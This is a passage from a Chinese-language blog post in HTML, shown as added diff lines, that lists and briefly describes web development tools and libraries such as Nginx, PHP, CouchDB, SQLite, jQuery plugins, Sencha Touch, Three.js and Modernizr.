+<li><strong><a href="http://nginx.net/" target="_blank">NGinx</a></strong>, 性能巨高无比的轻量级的Web服务器。比Apache高多了。花了6年的时间，终于走到了1.0版。</li>
+<li><strong><a href="http://httpd.apache.org/" target="_blank">Apache HTTP Server</a></strong> 是一个很流行的并支持多个流行的操作系统的Web服务器。</li>
+<li>★ <strong><a href="http://nodejs.org/" target="_blank"></a><a href="http://www.php.net/" target="_blank">PHP</a></strong> 可能是最流行的服务器端的Web脚本动态处理语言。</li>
+<li>当然，还有 <strong><a href="http://www.ruby-lang.org/fr/" target="_blank">Ruby</a></strong>, <strong><a href="http://www.python.org/" target="_blank">Python</a></strong>, <strong><a href="http://www.erlang.org/" target="_blank">Erlang</a></strong>, <strong><a href="http://www.perl.org/" target="_blank">Perl</a></strong>, <strong><a href="http://www.java.com/fr/" target="_blank">Java</a></strong>, <strong><a href="http://www.microsoft.com/net/" target="_blank">.NET</a></strong>, <strong><a href="http://www.android.com/" target="_blank">Android</a></strong>, <strong><a href="http://cpp.developpez.com/" target="_blank">C++</a></strong>, <strong><a href="http://golang.org/" target="_blank">Go</a></strong>,<a href="https://github.com/pmcelhaney/Mustache.cfc"></a><strong><a href="http://fantom.org/" target="_blank"> Fantom</a></strong>,<strong><a href="http://jashkenas.github.com/coffee-script/" target="_blank">CoffeeScript</a></strong>, <strong><a href="http://www.digitalmars.com/" target="_blank">D</a></strong>, …</li>
+</ul>
+<h4>PHP 框架和工具</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="drupal" src="http://www.b2bweb.fr/wp-content/uploads/drupal.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://wordpress.org/download/" target="_blank"><strong>WordPress</strong></a> 是一个基于博客系统的开源软件。参看《<a title="WordPress是怎么赢的？" href="https://coolshell.cn/articles/3716.html" target="_blank">WordPress是怎么赢的？</a>》</li>
+<li><strong><a href="http://drupal.org/" target="_blank">Drupal</a></strong> 是一个内容管理系统 (CMS).</li>
+<li><a href="http://www.centurion-project.org/" target="_blank"><strong>Centurion</strong></a> 是一个新出现的开源 CMS ，一个灵然的 PHP5 Content Management Framework. 使用 Zend Framework, 其组件坚持通用，简单，清楚和可重用的设计原则。</li>
+<li><strong><a href="http://www.phpbb.com/" target="_blank">phpBB</a></strong> 一个开源的论坛（国内的Discuz！更多）</li>
+<li><strong>★ <a href="http://simplepie.org/" target="_blank">SimplePie</a></strong> : 超快的，易用的,  RSS  和 Atom feed PHP解析。</li>
+<li><strong>★ <a href="http://phpthumb.gxdlabs.com/" target="_blank">PHPthumb</a></strong>, PHP 图片处理库</li>
+<li><strong>★ <a href="http://phpmailer.worxware.com/" target="_blank">PHPMailer</a></strong> 强大的全功能的PHP邮件库</li>
+<li><strong><a href="http://code.google.com/p/pubsubhubbub/" target="_blank">PubSubHubbub</a></strong>协议，一个简单，开放， server-to-server 的 pubsub (publish/subscribe) 协议——Atom and RSS的扩展。</li>
+<li>更多的请参看 &#8211; <a title="20 你应该知道的PHP库" href="https://coolshell.cn/articles/200.html" target="_blank">20个你应该知道PHP库</a> 和 <a title="9个强大免费的PHP库" href="https://coolshell.cn/articles/455.html" target="_blank">9个强大免费的PHP库</a></li>
+</ul>
+<h4>数据库</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="sqldesigner" src="http://www.b2bweb.fr/wp-content/uploads/sqldesigner.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://couchdb.apache.org/" target="_blank"><strong>Apache CouchDB</strong></a> 是一个面向文档的数据库管理系统。它提供以JSON 作为数据格式的REST 接口来对其进行操作，并可以通过视图来操纵文档的组织和呈现。.<a href="https://github.com/apache/couchdb" target="_blank">源码</a>.</li>
+<li><a href="http://code.google.com/p/monoql/" target="_blank"><strong>MonoQL</strong></a> 是一个采用PHP+ExtJS开发的MySQL数据库管理工具。界面极像一个桌面应用程序，支持大部分常用的功能包括：表格设计，数据浏览/编辑，数据导入/导出和高级查询等。</li>
+<li><strong> </strong><a href="http://mariadb.org/"><strong>MariaDB</strong></a> 是<a title="MySQL" href="http://www.mysql.com/" target="_blank">MySQL</a>的一个分支，由MySQL 创始人Monty Widenius 所开发。GPL，用来对抗Oracle所有的MySQL的license的不测。自Oracle收购SUN以来，整个社区对于MySQL前途的担忧就没有停止过。</li>
+<li>★ <a href="http://www.sqlite.org/" target="_blank"><strong>SQLite</strong></a> 不像常见的客户端/服务器结构范例，SQLite引擎不是个程序与之通信的独立进程，而是连接到程序中成为它的一个主要部分。所以主要的通信协议是在编程语言内的直接API调用。这在消耗总量、延迟时间和整体简单性上有积极的作用。整个数据库（定义、表、索引和数据本身）都在宿主主机上存储在一个单一的文件中。它的简单的设计是通过在开始一个事务的时候锁定整个数据文件而完成的。库实现了多数的SQL-92标准，包括事务，就是代表原子性、一致性、隔离性和持久性的（ACID），触发器和多数的复杂查询。不进行类型检查。你可以把字符串插入到整数列中。某些用户发现这是使数据库更加有用的创新，特别是与无类型的脚本语言一起使用的时候。其他用户认为这是主要的缺点。</li>
+<li><strong><a href="http://ondras.zarovi.cz/sql/demo/" target="_blank">SQL 在线设计编辑器</a></strong>，这一节的那个图片就是这个在线编辑器的样子了。一个画数据库图表的在线工具。很强大。</li>
+</ul>
+<h4>API 和 在线数据</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="yql" src="http://www.b2bweb.fr/wp-content/uploads/yql.png" alt="" width="600" height="238" /></p>
+<ul>
+<li><a href="http://www.programmableweb.com/apis/directory" target="_blank"><strong>ProgrammableWeb</strong></a>, 最流行的Web Services 和 API 目录大全。</li>
+<li><strong><a href="http://code.google.com/intl/fr/apis/gdata/docs/directory.html" target="_blank">Google Data Protocol</a></strong> 一组Google服务的数据服务API。</li>
+<li><a href="http://developer.yahoo.com/everything.html" target="_blank"><strong>Yahoo! Developer Network</strong></a> – APIs 和 Tools</li>
+<li><a href="http://pipes.yahoo.com/" target="_blank"><strong>Yahoo! Pipes</strong></a> 可视化在线编程工具，它是一个用于过滤、转换和聚合网页内容的服务。</li>
+<li>★ The <a href="http://developer.yahoo.com/yql/console/" target="_blank"><strong>Yahoo! Query Language</strong></a> 一个很像 SQL的网页查询工具。</li>
+</ul>
+<h4>在线代码和媒体编辑器</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="jsfiddle" src="http://www.b2bweb.fr/wp-content/uploads/jsfiddle.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://www.coderun.com/" target="_blank"><strong>CodeRun Studio</strong></a>一个基于JavaScript语言开发的跨平台的集成开发环境，它立足于云计算的设计思路，方便开发者在浏览器端便可以轻松开发、调试和部署网络应用程序。（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1883.html" target="_blank">Coderun.com 在线开发IDE</a>》）</li>
+<li><a href="https://github.com/ajaxorg/cloud9" target="_blank"><strong>Cloud9 IDE</strong></a> – 一个基于Node.JS构建的JavaScript程序开发Web IDE。它拥有一个非常快的文本编辑器支持为JS, HTML, CSS和这几种的混合代码进行着色显示。</li>
+<li>★ <a href="http://jsfiddle.net/" target="_blank"><strong>jsFiddle</strong></a> – Javascript的在线运行展示框架，这个工具可以有效的帮助web前端开发人员来有效分享和演示前端效果，其简单而强大 (JavaScript, MooTools, jQuery, Prototype, YUI, Glow and Dojo, HTML, CSS)</li>
+<li><strong><a href="http://www.akshell.com/" target="_blank">Akshell</a>，</strong>一种云服务，它使用服务端的JavaScript和在线的IDE帮助开发者进行快速应用程序开发。 它还提供云托管，所以部署是即时的。</li>
+<li><a href="http://braincast.nl/samples/jsoneditor/" target="_blank"><strong>JSONeditor</strong></a>, 一个好用的JSON 编辑器</li>
+<li>★ <a href="http://tinymce.moxiecode.com/wiki.php/TinyMCE" target="_blank"><strong>TinyMCE</strong></a> 一个轻量级的基于浏览器的所见即所得编辑器，支持目前流行的各种浏览器，由JavaScript写成。</li>
+<li><a href="http://www.sencha.com/products/designer/" target="_blank"><strong>Ext Designer</strong></a> 是一个桌面应用工具，帮助你快速开发基于ExtJS 的用户界面。</li>
+<li>★  <strong><a href="http://www.lucidchart.com/" target="_blank">LucidChart</a></strong>，一款基于最新的html5技术的在线图表绘制软件，功能强大，速度快捷，运行此软件需要支持html5的浏览器。</li>
+<li><a href="http://balsamiq.com/products/mockups" target="_blank"><strong>Balsamiq Mockups</strong></a>, 产品设计师绘制线框图或产品原型界面的利器。</li>
+<li><a href="http://colorschemedesigner.com/" target="_blank"><strong>Color Scheme Designer</strong></a> 3 &#8211; 一个免费的线上调色工具</li>
+<li>★ <a href="http://pixlr.com/editor/" target="_blank"><strong>Pixlr</strong></a>, 是一个来自瑞典基于Flash的免费在线图片处理网站。除了操作介面和功能接近Photoshop，还是多语言版本，支持简体中文。（以前<a title="在线作图编辑服务" href="https://coolshell.cn/articles/3244.html" target="_blank">酷壳介绍过</a>）</li>
+<li><a href="http://www.aviary.com/" target="_blank"><strong>Aviary</strong></a>, 是一个基于HTML5 的在线图片处理工具，可以很容易的对图片进行后期处理。 <a href="http://developers.aviary.com/" target="_blank">Aviary API</a></li>
+<li><strong><a href="http://www.degraeve.com/favicon/" target="_blank">Favicon Generator</a>, </strong>线上favicon(16&#215;16)制作工具。</li>
+</ul>
+<h4>代码资源和版本控制</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="github" src="http://www.b2bweb.fr/wp-content/uploads/github.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="https://github.com/" target="_blank"><strong>GitHub</strong></a> 是一个用于使用Git版本控制系统的项目的基于互联网的存取服务。</li>
+<li><a href="http://code.google.com/p/msysgit/" target="_blank"><strong>Git</strong></a> 是一个由Linus为了更好地管理linux内核开发而创立的分布式版本控制／软件配置管理软件。其巨快无比，高效，采用了分布式版本库的方式，不必服务器端软件支持，使源代码的发布和交流极其方便。</li>
+<li><a href="http://code.google.com/" target="_blank"><strong>Google Code</strong></a> 谷歌公司官方的开发者网站，包含各种开发技术的API、开发工具、以及开发技术参考资料。</li>
+<li><strong><a href="http://code.google.com/intl/zh-CN/apis/libraries/" target="_blank">Google Libraries API</a></strong> Google 将优秀的 JavaScript 框架部署在其 CDN 上，在我们的网站上使用 Google Libraries API 可以加速 JavaScript 框架的加载速度。</li>
+<li><a href="http://snipplr.com/" target="_blank"><strong>Snipplr</strong></a> 一个开放的源代码技巧分享社区，号称Code 2.0。和一般的源码分享网站不同，它针对的并不是大型网站源码，而是一些编程的代码技巧。</li>
+</ul>
+<h4>JavaScript 桌面应用框架</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="jqueryUI" src="http://www.b2bweb.fr/wp-content/uploads/jqueryUI.jpg" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://jquery.com/" target="_blank"><strong>jQuery</strong></a> 是一个快速、简单的JavaScript library， 它简化了HTML 文件的traversing，事件处理、动画、Ajax 互动，从而方便了网页制作的快速发展。  <a href="https://github.com/jquery/jquery" target="_blank">源码</a>, <a href="http://api.jquery.com/" target="_blank">API</a>, <a href="http://api.jquery.com/browser/" target="_blank">API浏览</a>, <a href="http://interface.eyecon.ro/docs/animate" target="_blank">很不错的文档</a>.</li>
+<li>★ 官方的 <a href="http://jqueryui.com/" target="_blank"><strong>jQuery User Interface (UI) library</strong></a> (演示和文档). <a href="https://github.com/jquery/jquery-ui%20" target="_blank">源码</a>,<a href="http://jqueryui.com/themeroller/" target="_blank">Themes Roller</a>, <a href="http://jqueryui.com/download" target="_blank">Download</a>.</li>
+<li><a href="http://developer.yahoo.com/yui/2/" target="_blank"><strong>YUI 2</strong></a> — Yahoo! User Interface Library</li>
+<li><a href="http://mootools.net/" target="_blank"><strong>Mootools</strong></a>, 一个超级轻量级的 web2.0 JavaScript framework</li>
+<li><a href="http://www.prototypejs.org/" target="_blank"><strong>Prototype</strong></a> 提供面向对象的Javascript和AJAX</li>
+<li><a href="http://dojotoolkit.org/" target="_blank"><strong>Dojo</strong></a> The Dojo Toolkit，一个强大的无法被打败的面向对象JavaScript框架。主要由三大模块组成：Core、Dijit、DojoX。Core提供Ajax,events,packaging,CSS-based querying,animations,JSON等相关操作API。Dijit是一个可更换皮肤，基于模板的WEB UI控件库。DojoX包括一些创新/新颖的代码和控件：DateGrid，charts，离线应用，跨浏览器矢量绘图等。</li>
+<li>★ <a href="http://dev.sencha.com/deploy/ext-4.0.0/docs/" target="_blank"><strong>Ext JS 4</strong></a>, 业内最强大的 JavaScript framework。</li>
+<li><a href="http://phpjs.org/functions/index" target="_blank"><strong>PHP.js</strong></a>, 一个开源的JavaScript 库，它尝试在JavaScript 中实现PHP 函数。在你的项目中导入<em>PHP.JS</em> 库，可以在静态页面使用你喜欢的PHP 函数。</li>
+</ul>
+<h4>JavaScript 移动和触摸框架</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="senchatouch" src="http://www.b2bweb.fr/wp-content/uploads/senchatouch.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://jquerymobile.com/" target="_blank"><strong>jQuery Mobile</strong></a> : 是 jQuery 在手机上和平板设备上的版本。jQuery Mobile 不仅会给主流移动平台带来jQuery核心库，而且会发布一个完整统一的jQuery移动UI框架。支持全球主流的移动平台。jQuery Mobile开发团队说：能开发这个项目，我们非常兴奋。移动Web太需要一个跨浏览器的框架，让开发人员开发出真正的移动Web网站。我们将尽全力去满足这样的需求。 <a href="https://github.com/jquery/jquery-mobile" target="_blank">Sources</a>.</li>
+<li><a href="http://zeptojs.com/" target="_blank"><strong>Zepto.js</strong></a> Zepto.js 是支持移动WebKit浏览器的JavaScript框架，具有与jQuery兼容的语法。2-5k的库，通过不错的API处理绝大多数的基本工作。 <a href="https://github.com/madrobby/zepto" target="_blank">Sources</a>.</li>
+<li><a href="http://microjs.com/" target="_blank"><strong>MicroJS</strong></a> : Microjs网站应用列出了很多轻量的Javascript类库和框架，它们都很小，大部分小于5kb。这样你不需要因为只需要一个功能就要加载一个JS的框架。</li>
+<li>★ <a href="http://phonegap.com/" target="_blank"><strong>PhoneGap</strong></a> :是一款开源的手机应用开发平台，它仅仅只用HTML和JavaScript语言就可以制作出能在多个移动设备上运行的应用。 <a href="https://github.com/phonegap/phonegap" target="_blank">Sources</a>.</li>
+<li>★ <a href="http://www.sencha.com/products/touch/" target="_blank"><strong>Sencha Touch</strong></a> Sencha Touch 是一个支持多种智能手机平台（iPhone, Android, 和BlackBerry）的 HTML5 框架。Sencha Touch可以让你的Web App看起来像Native App。美丽的用户界面组件和丰富的数据管理，全部基于最新的HTML5和CSS3的 WEB标准，全面兼容Android和Apple iOS设备。</li>
+<li><a href="http://jqtouch.com/" target="_blank"><strong>JQtouch</strong></a>, 是一个jQuery 的插件，主要用于手机上的Webkit 浏览器上实现一些包括动画、列表导航、默认应用样式等各种常见UI效果的JavaScript 库。 <a href="http://github.com/senchalabs/jQTouch" target="_blank">Sources</a>.</li>
+<li><a href="http://www.dhtmlx.com/touch/" target="_blank"><strong>DHTMLX Touch</strong></a> 针对移动和触摸设备的JavaScript 框架。DHTMLX Touch基于HTML5，创建移动web应用。它不只是一组UI 小工具，而是一个完整的框架，可以针对移动和触摸设备创建跨平台的web应用。它兼容主流的web浏览器，用DHTMLX Touch创建的应用，可以在iPad、iPhone、Android智能手机等上面运行流畅。</li>
+</ul>
+<h4>jQuery 插件</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="flexiGrid" src="http://www.b2bweb.fr/wp-content/uploads/flexiGrid.jpg" alt="" width="600" height="238" /></p>
+<ul>
+<li><a href="http://imakewebthings.github.com/jquery-waypoints/" target="_blank"><strong>Waypoints</strong></a> 是一个jQuery 用来实现捕获各种滚动事件的插件，例如实现无翻页的内容浏览，或者固定某个元素不让滚动等等。支持主流浏览器版本。</li>
+<li><strong><a href="http://plugins.jquery.com/project/lazy" target="_blank">Lazy loader</a> </strong>插件可以实现图片的延迟加载，当网页比较长的时候，会先只加载用户视窗内的图片，视窗外的图片会等到你拖动滚动条至后面才加载，这样有效的避免了因图片过多而加载慢的弊端。</li>
+<li><a href="https://github.com/gskinner/TweenJS" target="_blank"><strong>TweenJS</strong></a> : 一个简单和强大的 tweening / animation 的Javascript库。</li>
+<li><a href="http://janne.aukia.com/easie/" target="_blank"> <strong>Easings</strong></a> 类Css3的jQuery 动画插件</li>
+<li><a href="http://www.spritely.net/" target="_blank"><strong>Spritely</strong></a> 这个插件可以创建出如flash一样的动画效果，比如：在页面上有一只飞动的小鸟，一个动态滚动的背景等。</li>
+<li><strong><a href="https://github.com/blueimp/jQuery-File-Upload/" target="_blank">File Upload</a>, </strong>jQuery 文件上传插件4.4.1</li>
+<li><a href="http://www.agilecarousel.com/" target="_blank"><strong>Slideshow/Carousel</strong></a> 插件. <a href="https://github.com/edtalmadge/Agile-Carousel" target="_blank">Sources</a>.</li>
+<li><a href="http://www.buildinternet.com/project/supersized/" target="_blank"><strong>Supersized</strong></a> – 全屏式的背景/幻灯片插件</li>
+<li><a href="http://desandro.com/resources/jquery-masonry" target="_blank"><strong>Masonry</strong></a> i一款非常酷的自动排版插件，这款jQuery工具可以根据网格来自动排列水平和垂直元素，超越原来的css. <a href="https://github.com/desandro/masonry" target="_blank">Sources</a>.</li>
+<li>jQuery 简单 <a href="http://layout.jquery-dev.net/demos.cfm" target="_blank"><strong>Layout</strong></a> 演示，管理各种边栏式，可改变大小式的布局。</li>
+<li><a href="http://www.flexigrid.info/" target="_blank"><strong>Flexigrid</strong></a> – jQuery <a href="http://www.flexigrid.info/" target="_blank"><strong></strong></a>数据表插件</li>
+<li><a href="http://isotope.metafizzy.co/" target="_blank"><strong>Isotope</strong></a>绝对是一个令人难以置信的<em>jQuery</em>插件，你可以用它来创建动态和智能布局。你可以隐藏和显示与过滤项目，重新排序和整理甚至更多。</li>
+<li><a href="http://www.evanbyrne.com/article/super-gestures-jquery-plugin" target="_blank"><strong>Super Gestures</strong></a> jQuery 插件可以实现鼠标手势的功能。</li>
+<li><a href="https://github.com/brandonaaron/jquery-mousewheel" target="_blank"><strong>MouseWheel</strong></a> 是由Brandon Aaron开发的<em>jQuery</em>插件，用于添加跨浏览器的鼠标滚轮支持。</li>
+<li><a href="http://code.drewwilson.com/entry/autosuggest-jquery-plugin" target="_blank"><strong>AutoSuggest</strong></a> jQuery 插件可以让你添加一些自动完成的功能。</li>
+<li><a href="http://craigsworks.com/projects/qtip/" target="_blank"><strong>qTip</strong></a> 一个漂亮的<em>jQuery</em> 的工具提示插件，这个插件功能相当强大。</li>
+<li>jQuery <a href="http://www.highcharts.com/demo/" target="_blank"><strong>Charts and graphic</strong></a> 用来制作图表。</li>
+<li>jQuery Tools– The <a href="http://flowplayer.org/tools/demos/" target="_blank"><strong>missing UI library</strong></a></li>
+</ul>
+<h4>其它 jQuery 资源</h4>
+<ul>
+<li><a href="http://www.smashingmagazine.com/2011/04/07/useful-javascript-and-jquery-tools-libraries-plugins" target="_blank">http://www.smashingmagazine.com/2011/04/07/useful-javascript-and-jquery-tools-libraries-plugins</a></li>
+<li><a href="http://webdesigneraid.com/weekly-html5-news-and-inspirations-%E2%80%93-tutorials-tools-resources-and-freebies-v-2/" target="_blank">http://webdesigneraid.com/weekly-html5-news-and-inspirations-%E2%80%93-tutorials-tools-resources-and-freebies-v-2/</a></li>
+<li><a href="http://www.designer-daily.com/15-useful-jquery-plugins-and-tutorials-5207" target="_blank">http://www.designer-daily.com/15-useful-jquery-plugins-and-tutorials-5207</a></li>
+<li><a href="http://www.julien-verkest.fr/22/11/2007/240-plugins-jquery" target="_blank">http://www.julien-verkest.fr/22/11/2007/240-plugins-jquery</a></li>
+<li><a href="http://www.hotscripts.com/blog/10-great-html5-experiments-apps/" target="_blank">http://www.hotscripts.com/blog/10-great-html5-experiments-apps/</a></li>
+<li><a href="http://www.noupe.com/jquery/excellent-jquery-navigation-menu-tutorials.html" target="_blank">http://www.noupe.com/jquery/excellent-jquery-navigation-menu-tutorials.html</a></li>
+<li><a href="http://www.noupe.com/php/20-useful-php-jquery-tutorials.html" target="_blank">http://www.noupe.com/php/20-useful-php-jquery-tutorials.html</a></li>
+<li><a href="http://aext.net/2010/04/excellent-jquery-plugins-resources-for-data-presentation-and-grid-layout/" target="_blank">http://aext.net/2010/04/excellent-jquery-plugins-resources-for-data-presentation-and-grid-layout/</a></li>
+<li><a href="http://webdesigneraid.com/html5-canvas-graphing-solutions-every-web-developers-must-know/" target="_blank">http://webdesigneraid.com/html5-canvas-graphing-solutions-every-web-developers-must-know/</a></li>
+<li><a href="http://gestureworks.com/features/open-source-gestures/" target="_blank">http://gestureworks.com/features/open-source-gestures/</a></li>
+<li><a href="http://edtechdev.wordpress.com/2011/01/14/some-exciting-new-html5javascript-projects/" target="_blank">http://edtechdev.wordpress.com/2011/01/14/some-exciting-new-html5javascript-projects/</a></li>
+<li><a href="http://net.tutsplus.com/articles/web-roundups/30-developers-you-must-subscribe-to-as-a-javascript-junkie/" target="_blank">http://net.tutsplus.com/articles/web-roundups/30-developers-you-must-subscribe-to-as-a-javascript-junkie/</a></li>
+</ul>
+<h4>HTML5 视频播放器</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="leanBackPlayer" src="http://www.b2bweb.fr/wp-content/uploads/leanBackPlayer.jpg" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="https://github.com/webmademovies/popcorn-js" target="_blank"><strong>Popcorn.js</strong></a> 是一个HTML5 Video框架，它提供了易于使用的API来同步交互式内容，让操作HTML5 Video元素的属性，方法和事件变得简单易用。 (来自Mozilla)</li>
+<li><a href="http://dev.mennerich.name/showroom/html5_video/" target="_blank"><strong>LeanBack Player</strong></a> HTML5视频播放器,没有依赖任何JavaScript框架。支持全屏播放，音量控制，在同一个页面中播放多个视频。 (来自Google)</li>
+<li><a href="http://m.vid.ly/user/" target="_blank"><strong>Vid.ly</strong></a> 为你上传的视频提供转换功能，并且为转换后的视频创建一个短网址。通过Vid.ly，让你的视频可以在14种不同的浏览器和设备上播放，不需要再去考虑将要浏览视频的人使用什么设备了，以避免各各软件巨头之间的利益之争带来了不兼容，给用户带来了巨大的困扰，短网址让你可以通过Twitter、Facebook等方式方便分享视频。Vid.ly还可以通过html代码嵌入到其他网页中。Vid.ly免费帐户空间为1GB，免费帐户也没有播放或浏览限制。</li>
+</ul>
+<h4>JavaScript 音频处理与可视化效果</h4>
+<p><img decoding="async" loading="lazy" title="soundmanager" src="http://www.b2bweb.fr/wp-content/uploads/soundmanager.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ 使用HTML5 和 Flash, <a href="http://www.schillmania.com/projects/soundmanager2/" target="_blank"><strong>SoundManager V2</strong></a> 只用单一API的提供了可靠，简单和强大的跨平台的音频处理。</li>
+<li><a href="https://github.com/corbanbrook/dsp.js/" target="_blank"><strong>DSP</strong></a>, JavaScript的声音Digital Signal Processing</li>
+<li>The Radiolab <a href="http://yoyodyne.cc/radiolab/" target="_blank"><strong>Hyper Audio Player</strong></a> v1, 带给你 WNYC Radiolab, SoundCloud 和 Mozilla Drumbeat</li>
+<li><a href="http://jplayer.org/" target="_blank"><strong>jPlayer</strong></a>, 一个 jQuery HTML5 音频/ 视频库，功能齐全的API</li>
+</ul>
+<h4>JavaScript 图形 和 3D</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="processing" src="http://www.b2bweb.fr/wp-content/uploads/processing.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://processingjs.org/" target="_blank"><strong>Processing.js</strong></a>是一个开放的编程语言，在不使用Flash或Java小程序的前提下, 可以实现程序图像、动画和互动的应用。其使用Web标准，无需任何插件。</li>
+<li>★ Javascript 3D 引擎: <a href="https://github.com/mrdoob/three.js" target="_blank"><strong>ThreeJS</strong></a> 由 Mr Doob 开发，一个轻量级的 3D 引擎，不需要了解细节，傻瓜都能使用。这个引擎可以使用&lt;canvas&gt;, &lt;svg&gt; 和 WebGL.</li>
+<li><a href="http://www.iquilezles.org/apps/shadertoy/" target="_blank"><strong>Shader Toy</strong></a>, 一款使用WebGL的在线着色器编辑器(2D/3D). 基于在线的应用架构使您无需下载任何软件即可开始体验. Shader Toy包含大量实用着色器, 诸如光线追踪, 场景距离渲染, 球体, 隧道, 变形, 后期处理特效等.</li>
+<li><a href="http://senchalabs.github.com/philogl/" target="_blank"><strong>PhiloGL</strong></a>, Sencha的PhiloGL是首个WebGL开发工具之一，提供了高水准的功能，来构建WebGL应用。Sencha创建了几个演示，来描述框架交互式3D虚拟化的能力，比如<a href="http://senchalabs.github.com/philogl/PhiloGL/examples/temperatureAnomalies/">3D view of global temperature changes</a>。</li>
+<li><a href="http://benvanik.github.com/WebGL-Inspector/" target="_blank"><strong>WebGL Inspector</strong></a> 你就Firebug等Web调试工具一样，这个是 WebGL的调试工具。</li>
+<li><a href="http://www.khronos.org/webgl/wiki_1_15/" target="_blank"><strong>WebGL frameworks</strong></a> 由 Khronos Group 收集的一个WebGL框架列表。</li>
+<li><a href="http://easeljs.com/" target="_blank"><strong>EaselJS</strong></a>, 一个使用html5的canvas的 JavaScript 库. <a href="https://github.com/gskinner/EaselJS" target="_blank">Sources</a>.</li>
+<li><a href="http://www.webresourcesdepot.com/free-javascript-game-frameworks-to-create-a-web-based-fun/" target="_blank"><strong>JavaScript Game Frameworks</strong></a> 免费的JS游戏框架列表。另，可参看 <a title="JS游戏引擎列表" href="https://coolshell.cn/articles/3516.html" target="_blank">JS游戏框架列表</a>。</li>
+<li><a href="http://raphaeljs.com/" target="_blank"><strong>Raphaël</strong></a>是一个小型的JavaScript 库，用来简化在页面上显示向量图的工作。你可以用它在页面上绘制各种图表、并进行图片的剪切、旋转等操作。参看<a title="Javascript向量图Lib–Raphaël" href="https://coolshell.cn/articles/3107.html" target="_blank">Javascript向量图Lib–Raphaël</a></li>
+<li><a href="http://keith-wood.name/svgRef.html" target="_blank"><strong>jQuery SVG</strong></a> 插件让你可以了 SVG canvas 进行交互。</li>
+<li><a href="http://code.google.com/intl/fr/apis/chart/" target="_blank"><strong>Google chart tools</strong></a> &#8211;  参看本站的<a href="https://coolshell.cn/articles/582.html" target="_blank">使用Google API做统计图</a></li>
+<li><a href="https://coolshell.cn/articles/582.html" target="_blank"></a><a href="http://arborjs.org/" target="_blank"><strong>Arbor.js</strong></a>, 是一个利用webworkers和jQuery创建的数据图形可视化JavaScript框架。它为图形组织和屏幕刷新处理提供了一个高效、力导向布局算法。</li>
+</ul>
+<h4>JavaScript 浏览器接口 (HTML5)</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="amplify" src="http://www.b2bweb.fr/wp-content/uploads/amplify.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://www.modernizr.com/" target="_blank"><strong>Modernizr</strong></a> – 是一个专为HTML5 和CSS3 开发的功能检测类库，可以根据浏览器对HTML5 和CSS3 的支持程度提供更加便捷的前端优化方案.<a href="https://github.com/Modernizr/Modernizr" target="_blank">Sources</a>. 一个有用的列表 <a href="https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-browser-Polyfills" target="_blank">cross-browser Polyfills</a></li>
+<li><a href="http://code.google.com/p/html5shiv/" target="_blank"><strong>HTML5Shiv</strong></a> : 该项目的目的是为了让IE 能识别HTML5 的元素。</li>
+<li><a href="https://github.com/remy/polyfills" target="_blank"><strong>Polyfills</strong></a> : 这个项目收集了一些代码片段其用Javascript支持不同的浏览器的特别功能，有些代码需要Flash。</li>
+<li><a href="http://yepnopejs.com/" target="_blank"><strong>YepNopeJS</strong></a> : 一个异步的条件式的加载器。<a href="https://github.com/SlexAxton/yepnope.js" target="_blank">Sources</a>.</li>
+<li>jQuery <a href="https://github.com/codler/jQuery-Css3-Finalize/" target="_blank"><strong>CSS3 Finalise</strong></a> : 是否厌倦了为每一个浏览器的CSS3属性加前缀？</li>
+<li>★ <a href="http://amplifyjs.com/" target="_blank"><strong>Amplify.js</strong></a> :一套用于web应用数据管理和应用程序通讯的<strong> jQuery 组件库</strong>。提供简单易用的API接口。Amplify的目标是通过为各种数据源提供一个统一的程序接口简化各种格式数据的数据处理。Amplify的存储组件使用localStorage 和 sessionStorage标准处理客户端的存储信息，对一些老的浏览器支持可能有问题。Amplify&#8217;为jQuery的ajax方法request增加了一些额外的特性。 <a href="https://github.com/appendto/amplify" target="_blank">Sources</a>.</li>
+<li><a href="https://github.com/balupton/history.js" target="_blank"><strong>History.js</strong></a> 优美地支持了HTML5 History/State APIs</li>
+<li><a href="http://socket.io/" target="_blank"><strong>Socket.IO</strong></a> Web的socket编程。</li>
+</ul>
+<h4>JavaScript 工具</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="headJs" src="http://www.b2bweb.fr/wp-content/uploads/headJs.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★  {{<a href="http://mustache.github.com/" target="_blank"><strong>mustaches</strong></a>}} 小型的 JavaScript 模板引擎。</li>
+<li><a href="http://jsonselect.org/" target="_blank"><strong>json:select()</strong></a>, CSS式的JSON选择器</li>
+<li><a href="http://headjs.com/" target="_blank"><strong>HeadJS</strong></a>, 异步JavaScript装载。其最大特点就是不仅可以按顺序执行还可以并发装载载js。</li>
+<li><a href="http://code.google.com/p/jsdoc-toolkit/" target="_blank"><strong>JsDoc Toolkit</strong></a>是一款辅助工具，你只需要根据约定在JavaScript 代码中添加相应的注释，它就可以根据这些注释来自动生成API文档。</li>
+<li><a href="https://github.com/filamentgroup/Responsive-Images" target="_blank"><strong>Responsive image</strong></a>, 一个试验性的项目，用来处理<a href="http://www.alistapart.com/articles/responsive-web-design/">responsive layouts</a> 式的图片。</li>
